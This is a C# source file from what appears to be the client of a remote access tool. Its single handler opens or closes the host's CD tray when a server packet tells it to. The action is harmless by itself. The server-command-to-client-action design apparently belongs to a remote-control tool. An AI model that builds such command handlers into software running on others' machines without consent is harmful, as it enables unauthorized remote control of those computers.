using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Controllers
{
    public static class DoTrayCdOpenCloseController
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
        public static extern int mciSendString(string lpstrCommand,
                                                  StringBuilder lpstrReturnString,
                                                  int uReturnLength,
                                                       IntPtr hwndCallback);

        public static void openCloseTrayCD(Packets.ServerPackets.DoTrayCdOpenClose packet, ClientMosaique client)
        {
            if (packet.open)
            {
                int ret = mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
            }
            else
            {
                int ret = mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
            }
        }
    }
}
